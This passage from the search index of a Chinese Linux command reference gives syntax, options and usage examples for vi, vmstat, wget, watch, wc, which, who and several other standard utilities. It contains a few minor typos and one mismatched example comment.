\n\n通过输入vi的插入命令（i）、附加命令（a）、打开命令（o）、替换命令（s）、修改命令(c）或取代命令（r）可以从命令方式进入输入方式。在输入方式下，从键盘上输入的所有字符都被插入到正在编辑的缓冲区中，被当做该文件的正文。进入输入方式后，输入的可见字符都在屏幕上显示出来，而编辑命令不再起作用，仅作为普通字母出现。例如，在命令方式下输入字母i，进到输入方式，然后再输入i，就在屏幕上相应光标处添加一个字母i。\n\n由输入方式回到命令方式的办法是按下Esc键。如果已在命令方式下，那么按下Esc键就会发出“嘟嘟”声。为了确保用户想执行的vi命令是在命令方式下输入的，不妨多按几下Esc键，听到嘟声后再输入命令。\n\n**ex转义方式** \n\nvi和ex编辑器的功能是相同的，二者的主要区别是用户界面。在vi中，命令通常是单个字母，如a,x,r等。而在ex中，命令是以Enter；键结束的命令行。vi有一个专门的“转义”命令，可访问很多面向行的ex命令。为使用ex转义方式，可输入一个冒号（:）。作为ex命令提示符，冒号出现在状态行（通常在屏幕最下一行）。按下中断键（通常是Del键），可终止正在执行的命令。多数文件管理命令都是在ex转义方式下执行的（例如，读取文件，把编辑缓冲区的内容写到文件中等）。转义命令执行后，自动回到命令方式。例如：\n\n```shell\n:1,$s/I/i/g 按Enter键\n```\n\n则从文件第一行至文件末尾（$）将大写I全部替换成小写i。vi编辑器的三种工作方式之间的转换如图所示。\n\n!vi\n\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","vi"]},{"title":"【Linux 命令】vmstat","url":"/linux-command/vmstat/","content":"\n显示虚拟内存状态\n\n## 补充说明\n\n**vmstat命令** 的含义为显示虚拟内存状态（“Viryual Memor Statics”），但是它可以报告关于进程、内存、I/O等系统整体运行状态。\n\n###  语法\n\n```shell\nvmstat(选项)(参数)\n```\n\n###  选项\n\n```shell\n-a：显示活动内页；\n-f：显示启动后创建的进程总数；\n-m：显示slab信息；\n-n：头信息仅显示一次；\n-s：以表格方式显示事件计数器和内存状态；\n-d：报告磁盘状态；\n-p：显示指定的硬盘分区状态；\n-S：输出信息的单位。\n```\n\n###  参数\n\n*   事件间隔：状态信息刷新的时间间隔；\n*   次数：显示报告的次数。\n\n###  实例\n\n```shell\nvmstat 3\nprocs -----------memory---------- ---swap-- -----io---- --system-- -----cpu------\n r  b   swpd   free   buff  cache   si   so    bi    bo   in   cs us sy id wa st\n 0  0    320  42188 167332 1534368    0    0     4     7    1    0  0  0 99  0  0\n 0  0    320  42188 167332 1534392    0    0     0     0 1002   39  0  0 100  0  0\n 0  0    320  42188 167336 1534392    0    0     0    19 1002   44  0  0 100  0  0\n 0  0    320  42188 167336 1534392    0    0     0     0 1002   41  0  0 100  0  0\n 0  0    320  42188 167336 1534392    0    0     0     0 1002   41  0  0 100  0  0\n```\n\n **字段说明：** \n\nProcs（进程）\n\n*   r: 运行队列中进程数量，这个值也可以判断是否需要增加CPU。（长期大于1）\n*   b: 等待IO的进程数量。\n\nMemory（内存）\n\n*   swpd: 使用虚拟内存大小，如果swpd的值不为0，但是SI，SO的值长期为0，这种情况不会影响系统性能。\n*   free: 空闲物理内存大小。\n*   buff: 用作缓冲的内存大小。\n*   cache: 用作缓存的内存大小，如果cache的值大的时候，说明cache处的文件数多，如果频繁访问到的文件都能被cache处，那么磁盘的读IO bi会非常小。\n\nSwap\n\n*   si: 每秒从交换区写到内存的大小，由磁盘调入内存。\n*   so: 每秒写入交换区的内存大小，由内存调入磁盘。\n\n注意：内存够用的时候，这2个值都是0，如果这2个值长期大于0时，系统性能会受到影响，磁盘IO和CPU资源都会被消耗。有些朋友看到空闲内存（free）很少的或接近于0时，就认为内存不够用了，不能光看这一点，还要结合si和so，如果free很少，但是si和so也很少（大多时候是0），那么不用担心，系统性能这时不会受到影响的。\n\nIO（现在的Linux版本块的大小为1kb）\n\n*   bi: 每秒读取的块数\n*   bo: 每秒写入的块数\n\n注意：随机磁盘读写的时候，这2个值越大（如超出1024k)，能看到CPU在IO等待的值也会越大。\n\nsystem（系统）\n\n*   in: 每秒中断数，包括时钟中断。\n*   cs: 每秒上下文切换数。\n\n注意：上面2个值越大，会看到由内核消耗的CPU时间会越大。\n\nCPU（以百分比表示）\n\n*   us: 用户进程执行时间百分比(user time)\n\nus的值比较高时，说明用户进程消耗的CPU时间多，但是如果长期超50%的使用，那么我们就该考虑优化程序算法或者进行加速。\n\n*   sy: 内核系统进程执行时间百分比(system time)\n\nsy的值高时，说明系统内核消耗的CPU资源多，这并不是良性表现，我们应该检查原因。\n\n*   wa: IO等待时间百分比\n\nwa的值高时，说明IO等待比较严重，这可能由于磁盘大量作随机访问造成，也有可能磁盘出现瓶颈（块操作）。\n\n*   id: 空闲时间百分比\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","vmstat"]},{"title":"【Linux 命令】volname","url":"/linux-command/volname/","content":"\n显示指定的ISO-9660格式的设备的卷名称\n\n## 补充说明\n\n**volname命令** 用于显示指定的“ISO-9660”格式的设备的卷名称，通常这种格式的设备为光驱。\n\n###  语法\n\n```shell\nvolname(参数)\n```\n\n###  参数\n\n设备文件名：指定要显示卷名称的设备。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","volname"]},{"title":"【Linux 命令】w","url":"/linux-command/w/","content":"\n显示目前登入系统的用户信息\n\n## 补充说明\n\n**w命令** 用于显示已经登陆系统的用户列表，并显示用户正在执行的指令。执行这个命令可得知目前登入系统的用户有那些人，以及他们正在执行的程序。单独执行w命令会显示所有的用户，您也可指定用户名称，仅显示某位用户的相关信息。\n\n###  语法 \n\n```shell\nw(选项)(参数)\n```\n\n###  选项 \n\n```shell\n -h, --no-header     不打印头信息；\n -u, --no-current    当显示当前进程和cpu时间时忽略用户名；\n -s, --short         使用短输出格式；\n -f, --from          显示用户从哪登录；\n -o, --old-style     老式输出\n -i, --ip-addr       显示IP地址而不是主机名（如果可能）\n\n     --help     显示此帮助并退出\n -V, --version  显示版本信息。\n```\n\n###  参数 \n\n用户：仅显示指定用户。\n\n###  实例 \n\n```shell\nw\n 20:39:37 up 136 days,  3:58,  1 user,  load average: 0.00, 0.00, 0.00\nUSER     TTY      FROM              login@   IDLE   JCPU   PCPU WHAT\nroot     pts/0    222.94.97.122    20:39    1.00s  0.00s  0.00s w\n```\n\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","w"]},{"title":"【Linux 命令】wait","url":"/linux-command/wait/","content":"\n等待进程执行完后返回\n\n## 补充说明\n\n**wait命令** 用来等待指令的指令，直到其执行完毕后返回终端。该指令常用于shell脚本编程中，待指定的指令执行完成后，才会继续执行后面的任务。该指令等待作业时，在作业标识号前必须添加百分号\"%\"。\n\n###  语法\n\n```shell\nwait(参数)\n```\n\n###  参数\n\n进程或作业标示：指定进程号或者作业号。\n\n###  实例\n\n使用命令wait等待作业号为1的作业完成后再返回，输入如下命令：\n\n```shell\nwait %1       #等待作业号为3的作业完成 \n```\n\n执行上面的指令后，将输出指定作业号的指令，如下所示：\n\n```shell\nfind / -name password\n```\n\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","wait"]},{"title":"【Linux 命令】wall","url":"/linux-command/wall/","content":"\n向系统当前所有打开的终端上输出信息\n\n## 补充说明\n\n**wall命令** 用于向系统当前所有打开的终端上输出信息。通过wall命令可将信息发送给每位同意接收公众信息的终端机用户，若不给予其信息内容，则wall命令会从标准输入设备读取数据，然后再把所得到的数据传送给所有终端机用户。\n\n###  语法\n\n```shell\nwall(参数)\n```\n\n###  参数\n\n消息：指定广播消息。\n\n###  实例\n\n```shell\n[root@localhost ~]# wall this is a test line\n\nBroadcast message from root (pts/1) (Fri Dec 20 11:36:51 2013):\n\nthis is a test line\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","wall"]},{"title":"【Linux 命令】watch","url":"/linux-command/watch/","content":"\n可以将命令的输出结果输出到标准输出设备，多用于周期性执行命令/定时执行命令\n\n## 补充说明\n\n**watch命令** 以周期性的方式执行给定的指令，指令输出以全屏方式显示。watch是一个非常实用的命令，基本所有的Linux发行版都带有这个小工具，如同名字一样，watch可以帮你监测一个命令的运行结果，省得你一遍遍的手动运行。\n\n### 语法\n\n```shell\nwatch(选项)(参数)\n```\n\n### 选项\n\n```shell\n-n # 或--interval  watch缺省每2秒运行一下程序，可以用-n或-interval来指定间隔的时间。\n-d # 或--differences  用-d或--differences 选项watch 会高亮显示变化的区域。 而-d=cumulative选项会把变动过的地方(不管最近的那次有没有变动)都高亮显示出来。\n-t # 或-no-title  会关闭watch命令在顶部的时间间隔,命令，当前时间的输出。\n-h, --help # 查看帮助文档\n```\n\n### 参数\n\n指令：需要周期性执行的指令。\n\n### 实例\n\n```shell\nwatch -n 1 -d netstat -ant       # 命令：每隔一秒高亮显示网络链接数的变化情况\nwatch -n 1 -d 'pstree|grep http' # 每隔一秒高亮显示http链接数的变化情况。 后面接的命令若带有管道符，需要加''将命令区域归整。\nwatch 'netstat -an | grep:21 | \\ grep<模拟攻击客户机的IP>| wc -l' # 实时查看模拟攻击客户机建立起来的连接数\nwatch -d 'ls -l|grep scf'       # 监测当前目录中 scf' 的文件的变化\nwatch -n 10 'cat /proc/loadavg' # 10秒一次输出系统的平均负载\nwatch uptime\nwatch -t uptime\nwatch -d -n 1 netstat -ntlp\nwatch -d 'ls -l | fgrep goface'     # 监测goface的文件\nwatch -t -differences=cumulative uptime\nwatch -n 60 from            # 监控mail\nwatch -n 1 \"df -i;df\"       # 监测磁盘inode和block数目变化情况\n```\n\nFreeBSD和Linux下watch命令的不同，在Linux下，watch是周期性的执行下个程序，并全屏显示执行结果，如：`watch -n 1 -d netstat -ant`，而在FreeBSD下的watch命令是查看其它用户的正在运行的操作，watch允许你偷看其它terminal正在做什么，该命令只能让超级用户使用。\n\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","watch"]},{"title":"【Linux 命令】wc","url":"/linux-command/wc/","content":"\n统计文件的字节数、字数、行数\n\n## 补充说明\n\n**wc命令** 统计指定文件中的字节数、字数、行数，并将统计结果显示输出。利用wc指令我们可以计算文件的Byte数、字数或是列数，若不指定文件名称，或是所给予的文件名为“-”，则wc指令会从标准输入设备读取数据。wc同时也给出所指定文件的总统计数。\n\n###  语法 \n\n```shell\nwc(选项)(参数)\nwc [选项]... [文件]...\nwc [选项]... --files0-from=F\n```\n\n###  选项 \n\n```shell\n-c # 统计字节数，或--bytes或——chars：只显示Bytes数；。\n-l # 统计行数，或——lines：只显示列数；。\n-m # 统计字符数。这个标志不能与 -c 标志一起使用。\n-w # 统计字数，或——words：只显示字数。一个字被定义为由空白、跳格或换行字符分隔的字符串。\n-L # 打印最长行的长度。\n-help     # 显示帮助信息\n--version # 显示版本信息\n```\n\n###  参数 \n\n文件：需要统计的文件列表。\n\n## 例子\n\n```shell\nwc -l *       # 统计当前目录下的所有文件行数及总计行数。\nwc -l *.js    # 统计当前目录下的所有 .js 后缀的文件行数及总计行数。\nfind  . * | xargs wc -l # 当前目录以及子目录的所有文件行数及总计行数。\n```\n\n查看文件的字节数、字数、行数\n\n```shell\nwc test.txt\n# 输出结果\n7     8     70     test.txt\n# 行数 单词数 字节数 文件名\n```\n\n用wc命令怎么做到只打印统计数字不打印文件名\n\n```shell\nwc -l < test.txt\n# 输出结果\n7\n```\n\n用来统计当前目录下的文件数(不包含隐藏文件)\n\n```shell\n# 要去除TOTAL行\nexpr $(ls -l | wc -l) - 1\n# 输出结果\n8\n```\n\n统计当前目录下的所有文件行数及总计行数\n\n```shell\n[root@centos7 ~]# wc -l *\n      21 LICENSE\n     270 README.md\nwc: example: read: Is a directory\n     785 lerna-debug.log\n      25 lerna.json\nwc: node_modules: read: Is a directory\n   23603 package-lock.json\n      79 package.json\n       3 renovate.json\n   24786 total\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","wc"]},{"title":"【Linux 命令】wget","url":"/linux-command/wget/","content":"\nLinux系统下载文件工具\n\n## 补充说明\n\n**wget命令** 用来从指定的URL下载文件。wget非常稳定，它在带宽很窄的情况下和不稳定网络中有很强的适应性，如果是由于网络的原因下载失败，wget会不断的尝试，直到整个文件下载完毕。如果是服务器打断下载过程，它会再次联到服务器上从停止的地方继续下载。这对从那些限定了链接时间的服务器上下载大文件非常有用。\n\nwget支持HTTP，HTTPS和FTP协议，可以使用HTTP代理。所谓的自动下载是指，wget可以在用户退出系统的之后在后台执行。这意味这你可以登录系统，启动一个wget下载任务，然后退出系统，wget将在后台执行直到任务完成，相对于其它大部分浏览器在下载大量数据时需要用户一直的参与，这省去了极大的麻烦。\n\n用于从网络上下载资源，没有指定目录，下载资源回默认为当前目录。wget虽然功能强大，但是使用起来还是比较简单：\n\n1. **支持断点下传功能** 这一点，也是网络蚂蚁和FlashGet当年最大的卖点，现在，Wget也可以使用此功能，那些网络不是太好的用户可以放心了；\n2. **同时支持FTP和HTTP下载方式** 尽管现在大部分软件可以使用HTTP方式下载，但是，有些时候，仍然需要使用FTP方式下载软件；\n3. **支持代理服务器** 对安全强度很高的系统而言，一般不会将自己的系统直接暴露在互联网上，所以，支持代理是下载软件必须有的功能；\n4. **设置方便简单** 可能，习惯图形界面的用户已经不是太习惯命令行了，但是，命令行在设置上其实有更多的优点，最少，鼠标可以少点很多次，也不要担心是否错点鼠标；\n5. **程序小，完全免费** 程序小可以考虑不计，因为现在的硬盘实在太大了；完全免费就不得不考虑了，即使网络上有很多所谓的免费软件，但是，这些软件的广告却不是我们喜欢的。\n\n\n###  语法\n\n```shell\nwget [参数] [URL地址]\n```\n\n###  选项\n\n```shell\n启动参数：\n\n-V, –-version 显示wget的版本后退出\n-h, –-help 打印语法帮助\n-b, –-background 启动后转入后台执行\n-e, –-execute=COMMAND 执行 `.wgetrc’格式的命令，wgetrc格式参见/etc/wgetrc或~/.wgetrc\n\n记录和输入文件参数：\n\n-o, –-output-file=FILE 把记录写到FILE文件中\n-a, –-append-output=FILE 把记录追加到FILE文件中\n-d, –-debug 打印调试输出\n-q, –-quiet 安静模式(没有输出)\n-v, –-verbose 冗长模式(这是缺省设置)\n-nv, –-non-verbose 关掉冗长模式，但不是安静模式\n-i, –-input-file=FILE 下载在FILE文件中出现的URLs\n-F, –-force-html 把输入文件当作HTML格式文件对待\n-B, –-base=URL 将URL作为在-F -i参数指定的文件中出现的相对链接的前缀\n–-sslcertfile=FILE 可选客户端证书\n–-sslcertkey=KEYFILE 可选客户端证书的KEYFILE\n–-egd-file=FILE 指定EGD socket的文件名\n\n下载参数：\n\n–-bind-address=ADDRESS 指定本地使用地址(主机名或IP，当本地有多个IP或名字时使用)\n-t, –-tries=NUMBER 设定最大尝试链接次数(0 表示无限制).\n-O –-output-document=FILE 把文档写到FILE文件中\n-nc, –-no-clobber 不要覆盖存在的文件或使用.#前缀\n-c, –-continue 接着下载没下载完的文件\n–progress=TYPE 设定进程条标记\n-N, –-timestamping 不要重新下载文件除非比本地文件新\n-S, –-server-response 打印服务器的回应\n–-spider 不下载任何东西\n-T, –-timeout=SECONDS 设定响应超时的秒数\n-w, –-wait=SECONDS 两次尝试之间间隔SECONDS秒\n–waitretry=SECONDS 在重新链接之间等待1…SECONDS秒\n–random-wait 在下载之间等待0…2*WAIT秒\n-Y, –-proxy=on/off 打开或关闭代理\n-Q, –-quota=NUMBER 设置下载的容量限制\n-–limit-rate=RATE 限定下载输率\n\n目录参数：\n\n-nd –-no-directories 不创建目录\n-x, –-force-directories 强制创建目录\n-nH, –-no-host-directories 不创建主机目录\n-P, –-directory-prefix=PREFIX 将文件保存到目录 PREFIX/…\n–cut-dirs=NUMBER 忽略 NUMBER层远程目录\n\nHTTP 选项参数：\n\n-–http-user=USER 设定HTTP用户名为 USER.\n-–http-passwd=PASS 设定http密码为 PASS\n-C, –-cache=on/off 允许/不允许服务器端的数据缓存 (一般情况下允许)\n-E, –-html-extension 将所有text/html文档以.html扩展名保存\n-–ignore-length 忽略 `Content-Length’头域\n-–header=STRING 在headers中插入字符串 STRING\n-–proxy-user=USER 设定代理的用户名为 USER\n-–proxy-passwd=PASS 设定代理的密码为 PASS\n-–referer=URL 在HTTP请求中包含 `Referer: URL’头\n-s, –-save-headers 保存HTTP头到文件\n-U, –-user-agent=AGENT 设定代理的名称为 AGENT而不是 Wget/VERSION\n-–no-http-keep-alive 关闭 HTTP活动链接 (永远链接)\n–-cookies=off 不使用 cookies\n–-load-cookies=FILE 在开始会话前从文件 FILE中加载cookie\n-–save-cookies=FILE 在会话结束后将 cookies保存到 FILE文件中\n\nFTP 选项参数：\n\n-nr, -–dont-remove-listing 不移走 `.listing’文件\n-g, -–glob=on/off 打开或关闭文件名的 globbing机制\n-–passive-ftp 使用被动传输模式 (缺省值).\n-–active-ftp 使用主动传输模式\n-–retr-symlinks 在递归的时候，将链接指向文件(而不是目录)\n\n递归下载参数：\n\n-r, -–recursive 递归下载－－慎用!\n-l, -–level=NUMBER 最大递归深度 (inf 或 0 代表无穷)\n–-delete-after 在现在完毕后局部删除文件\n-k, –-convert-links 转换非相对链接为相对链接\n-K, –-backup-converted 在转换文件X之前，将之备份为 X.orig\n-m, –-mirror 等价于 -r -N -l inf -nr\n-p, –-page-requisites 下载显示HTML文件的所有图片\n\n递归下载中的包含和不包含(accept/reject)：\n\n-A, –-accept=LIST 分号分隔的被接受扩展名的列表\n-R, –-reject=LIST 分号分隔的不被接受的扩展名的列表\n-D, –-domains=LIST 分号分隔的被接受域的列表\n–-exclude-domains=LIST 分号分隔的不被接受的域的列表\n–-follow-ftp 跟踪HTML文档中的FTP链接\n–-follow-tags=LIST 分号分隔的被跟踪的HTML标签的列表\n-G, –-ignore-tags=LIST 分号分隔的被忽略的HTML标签的列表\n-H, –-span-hosts 当递归时转到外部主机\n-L, –-relative 仅仅跟踪相对链接\n-I, –-include-directories=LIST 允许目录的列表\n-X, –-exclude-directories=LIST 不被包含目录的列表\n-np, –-no-parent 不要追溯到父目录\nwget -S –-spider url 不下载只显示过程\n```\n\n###  参数\n\nURL：下载指定的URL地址。\n\n###  实例\n\n**使用wget下载单个文件** \n\n```shell\nwget http://www.jsdig.com/testfile.zip\n```\n\n以下的例子是从网络下载一个文件并保存在当前目录，在下载的过程中会显示进度条，包含（下载完成百分比，已经下载的字节，当前下载速度，剩余下载时间）。\n\n**下载并以不同的文件名保存** \n\n```shell\nwget -O wordpress.zip http://www.jsdig.com/download.aspx?id=1080\n```\n\nwget默认会以最后一个符合`/`的后面的字符来命令，对于动态链接的下载通常文件名会不正确。\n\n错误：下面的例子会下载一个文件并以名称`download.aspx?id=1080`保存:\n\n```shell\nwget http://www.jsdig.com/download?id=1\n```\n\n即使下载的文件是zip格式，它仍然以`download.php?id=1080`命名。\n\n正确：为了解决这个问题，我们可以使用参数`-O`来指定一个文件名：\n\n```shell\nwget -O wordpress.zip http://www.jsdig.com/download.aspx?id=1080\n```\n\n**wget限速下载** \n\n```shell\nwget --limit-rate=300k http://www.jsdig.com/testfile.zip\n```\n\n当你执行wget的时候，它默认会占用全部可能的宽带下载。但是当你准备下载一个大文件，而你还需要下载其它文件时就有必要限速了。\n\n**使用wget断点续传** \n\n```shell\nwget -c http://www.jsdig.com/testfile.zip\n```\n\n使用`wget -c`重新启动下载中断的文件，对于我们下载大文件时突然由于网络等原因中断非常有帮助，我们可以继续接着下载而不是重新下载一个文件。需要继续中断的下载时可以使用`-c`参数。\n\n**使用wget后台下载** \n\n```shell\nwget -b http://www.jsdig.com/testfile.zip\n\nContinuing in background, pid 1840.\nOutput will be written to `wget-log'.\n```\n\n对于下载非常大的文件的时候，我们可以使用参数`-b`进行后台下载，你可以使用以下命令来察看下载进度：\n\n```shell\ntail -f wget-log\n```\n\n**伪装代理名称下载** \n\n```shell\nwget --user-agent=\"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.204 Safari/534.16\" http://www.jsdig.com/testfile.zip\n```\n\n有些网站能通过根据判断代理名称不是浏览器而拒绝你的下载请求。不过你可以通过`--user-agent`参数伪装。\n\n**测试下载链接** \n\n当你打算进行定时下载，你应该在预定时间测试下载链接是否有效。我们可以增加`--spider`参数进行检查。\n\n```shell\nwget --spider URL\n```\n\n如果下载链接正确，将会显示:\n\n```shell\nSpider mode enabled. Check if remote file exists.\nHTTP request sent, awaiting response... 200 OK\nLength: unspecified [text/html]\nRemote file exists and could contain further links,\nbut recursion is disabled -- not retrieving.\n```\n\n这保证了下载能在预定的时间进行，但当你给错了一个链接，将会显示如下错误:\n\n```shell\nwget --spider url\nSpider mode enabled. Check if remote file exists.\nHTTP request sent, awaiting response... 404 Not Found\nRemote file does not exist -- broken link!!!\n```\n\n你可以在以下几种情况下使用`--spider`参数：\n\n*   定时下载之前进行检查\n*   间隔检测网站是否可用\n*   检查网站页面的死链接\n\n**增加重试次数** \n\n```shell\nwget --tries=40 URL\n```\n\n如果网络有问题或下载一个大文件也有可能失败。wget默认重试20次连接下载文件。如果需要，你可以使用`--tries`增加重试次数。\n\n**下载多个文件** \n\n```shell\nwget -i filelist.txt\n```\n\n首先，保存一份下载链接文件：\n\n```shell\ncat > filelist.txt\nurl1\nurl2\nurl3\nurl4\n```\n\n接着使用这个文件和参数`-i`下载。\n\n**镜像网站** \n\n```shell\nwget --mirror -p --convert-links -P ./LOCAL URL\n```\n\n下载整个网站到本地。\n\n*   `--miror`开户镜像下载。\n*   `-p`下载所有为了html页面显示正常的文件。\n*   `--convert-links`下载后，转换成本地的链接。\n*   `-P ./LOCAL`保存所有文件和目录到本地指定目录。\n\n**过滤指定格式下载** \n\n```shell\nwget --reject=gif ur\n```\n\n下载一个网站，但你不希望下载图片，可以使用这条命令。\n\n**把下载信息存入日志文件** \n\n```shell\nwget -o download.log URL\n```\n\n不希望下载信息直接显示在终端而是在一个日志文件，可以使用。\n\n**限制总下载文件大小** \n\n```shell\nwget -Q5m -i filelist.txt\n```\n\n当你想要下载的文件超过5M而退出下载，你可以使用。注意：这个参数对单个文件下载不起作用，只能递归下载时才有效。\n\n**下载指定格式文件** \n\n```shell\nwget -r -A.pdf url\n```\n\n可以在以下情况使用该功能：\n\n*   下载一个网站的所有图片。\n*   下载一个网站的所有视频。\n*   下载一个网站的所有PDF文件。\n\n**FTP下载** \n\n```shell\nwget ftp-url\nwget --ftp-user=USERNAME --ftp-password=PASSWORD url\n```\n\n可以使用wget来完成ftp链接的下载。\n\n使用wget匿名ftp下载：\n\n```shell\nwget ftp-url\n```\n\n使用wget用户名和密码认证的ftp下载：\n\n```shell\nwget --ftp-user=USERNAME --ftp-password=PASSWORD url\n```\n\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","wget"]},{"title":"【Linux 命令】whatis","url":"/linux-command/whatis/","content":"\n查询一个命令执行什么功能\n\n## 补充说明\n\n**whatis命令** 是用于查询一个命令执行什么功能，并将查询结果打印到终端上。\n\nwhatis命令在用`catman -w`命令创建的数据库中查找command参数指定的命令、系统调用、库函数或特殊文件名。whatis命令显示手册部分的页眉行。然后可以发出man命令以获取附加的信息。whatis命令等同于使用`man -f`命令。\n\n###  语法\n\n```shell\nwhatis\n```\n\n###  实例\n\n```shell\n[root@localhost ~]# whatis ls\nls                   (1)  - list directory contents\nls                   (1p)  - list directory contents\n\n[root@localhost ~]# whatis cp\ncp                   (1)  - copy files and directories\ncp                   (1p)  - copy files\n\n[root@localhost ~]# whatis chown\nchown                (1)  - change file owner and group\nchown                (1p)  - change the file ownership\nchown                (2)  - change ownership of a file\nchown                (3p)  - change owner and group of a file\n\n[root@localhost ~]# whatis man\nman                  (1)  - format and display the on-line manual pages\nman                  (1p)  - display system documentation\nman                  (7)  - macros to format man pages\nman                 (rpm) - A set of documentation tools: man, apropos and whatis.\nman-pages           (rpm) - Man (manual) pages from the Linux Documentation Project.\nman.config [man]     (5)  - configuration data for man\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","whatis"]},{"title":"【Linux 命令】whereis","url":"/linux-command/whereis/","content":"\n查找二进制程序、代码等相关文件路径\n\n## 补充说明\n\n**whereis命令** 用来定位指令的二进制程序、源代码文件和man手册页等相关文件的路径。\n\nwhereis命令只能用于程序名的搜索，而且只搜索二进制文件（参数-b）、man说明文件（参数-m）和源代码文件（参数-s）。如果省略参数，则返回所有信息。\n\n和find相比，whereis查找的速度非常快，这是因为linux系统会将 系统内的所有文件都记录在一个数据库文件中，当使用whereis和下面即将介绍的locate时，会从数据库中查找数据，而不是像find命令那样，通 过遍历硬盘来查找，效率自然会很高。 但是该数据库文件并不是实时更新，默认情况下时一星期更新一次，因此，我们在用whereis和locate 查找文件时，有时会找到已经被删除的数据，或者刚刚建立文件，却无法查找到，原因就是因为数据库文件没有被更新。\n\n###  语法\n\n```shell\nwhereis(选项)(参数)\n```\n\n###  选项\n\n```shell\n-b：只查找二进制文件；\n-B<目录>：只在设置的目录下查找二进制文件；\n-f：不显示文件名前的路径名称；\n-m：只查找说明文件；\n-M<目录>：只在设置的目录下查找说明文件；\n-s：只查找原始代码文件；\n-S<目录>只在设置的目录下查找原始代码文件；\n-u：查找不包含指定类型的文件。\n```\n\n###  参数\n\n指令名：要查找的二进制程序、源文件和man手册页的指令名。\n\n###  实例\n\n将相关的文件都查找出来\n\n```shell\n[root@localhost ~]# whereis tomcat\ntomcat:\n\n[root@localhost ~]# whereis svn\nsvn: /usr/bin/svn /usr/local/svn /usr/share/man/man1/svn.1.gz\n```\n\n说明：tomcat没安装，找不出来，svn安装找出了很多相关文件\n\n只将二进制文件查找出来 \n\n```shell\n[root@localhost ~]# whereis -b svn\nsvn: /usr/bin/svn /usr/local/svn\n\n[root@localhost ~]# whereis -m svn\nsvn: /usr/share/man/man1/svn.1.gz\n\n[root@localhost ~]# whereis -s svn\nsvn:\n```\n\n说明：`whereis -m svn`查出说明文档路径，`whereis -s svn`找source源文件。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","whereis"]},{"title":"【Linux 命令】which","url":"/linux-command/which/","content":"\n查找并显示给定命令的绝对路径\n\n## 补充说明\n\n**which命令** 用于查找并显示给定命令的绝对路径，环境变量PATH中保存了查找命令时需要遍历的目录。which指令会在环境变量$PATH设置的目录里查找符合条件的文件。也就是说，使用which命令，就可以看到某个系统命令是否存在，以及执行的到底是哪一个位置的命令。\n\n###  语法 \n\n```shell\nwhich(选项)(参数)\n```\n\n###  选项 \n\n```shell\n-n<文件名长度>：制定文件名长度，指定的长度必须大于或等于所有文件中最长的文件名；\n-p<文件名长度>：与-n参数相同，但此处的<文件名长度>包含了文件的路径；\n-w：指定输出时栏位的宽度；\n-V：显示版本信息。\n```\n\n###  参数 \n\n指令名：指令名列表。\n\n###  实例 \n\n查找文件、显示命令路径：\n\n```shell\n[root@localhost ~]# which pwd\n/bin/pwd\n\n[root@localhost ~]# which adduser\n/usr/sbin/adduser\n```\n\n说明：which是根据使用者所配置的 PATH 变量内的目录去搜寻可运行档的！所以，不同的 PATH 配置内容所找到的命令当然不一样的！\n\n用 which 去找出 cd\n\n```shell\n[root@localhost ~]# which cd\ncd: shell built-in command\n```\ncd 这个常用的命令竟然找不到啊！为什么呢？这是因为 cd 是bash 内建的命令！ 但是 which 默认是找 PATH 内所规范的目录，所以当然一定找不到的！\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","which"]},{"title":"【Linux 命令】who","url":"/linux-command/who/","content":"\n显示当前所有登陆用户的信息。\n\n## 概要\n\n```shell\nwho [OPTION]... [file] [am i]\n```\n\n## 主要用途\n\n- 当没有给出非选项参数时，按以下字段顺序为每个当前用户打印信息：登录用户名称，终端信息，登录时间，远程主机或X display。\n- 当用户执行 `who am i` 时，只显示运行该命令的用户的信息。\n\n## 选项\n\n```shell\n-a, --all                                等价于调用 '-b -d --login -p -r -t -T -u'。\n-b, --boot                               上次系统启动的时间。\n-d, --dead                               打印 dead 状态的进程。\n-H, --heading                            打印列标题行。\n-l, --login                              打印系统登录进程。\n--lookup                                 尝试通过 DNS 规范主机名。\n-m                                       仅显示和标准输入关联的主机名和用户。\n-p, --process                            打印由 init 生成的活动进程。\n-q, --count                              列出所有已登录的用户的名称和数量。\n-r, --runlevel                           打印当前运行级别。\n-s, --short                              仅打印名称、行和时间（默认）。\n-t, --time                               打印上次系统时钟更改。\n-T, -w, --mesg, --message, --writable    将 '+、-、?' 中的一个作为用户的消息状态添加到用户名称后面。\n-u, --users                              列出登录的用户。\n--help                                   显示帮助信息并退出。\n--version                                显示版本信息并退出。\n\n关于 -T 选项的 '+、-、?'：\n'+'  允许写入信息\n'-'  禁止写入信息\n'?'  不能查找到终端设备\n```\n\n## 参数\n\nfile（可选）：指定 `file` 代替默认的 `/var/run/utmp` 、`/etc/utmp` ；通常使用 `/var/log/wtmp` 作为参数用于查看过去登陆系统的用户。\n\n## 返回值\n\n返回0表示成功，返回非0值表示失败。\n\n## 例子\n\n```shell\n[root@localhost ~]# who\nroot     pts/0        2013-08-19 15:04 (192.168.0.134)\nroot     pts/1        2013-12-20 10:37 (180.111.155.40)\n\n[root@localhost ~]# who -q\nroot root\n# users=2\n\n[root@localhost ~]# who -H\nNAME     LINE         time             COMMENT\nroot     pts/0        2013-08-19 15:04 (192.168.0.134)\nroot     pts/1        2013-12-20 10:37 (180.111.155.40)\n\n[root@localhost ~]# who -w\nroot     + pts/0        2013-08-19 15:04 (192.168.0.134)\nroot     + pts/1        2013-12-20 10:37 (180.111.155.40)\n```\n\n### 注意\n\n1. 该命令是`GNU coreutils`包中的命令，相关的帮助信息请查看`man -s 1 who`，`info coreutils 'who invocation'`。\n\n\n","categories":["Linux 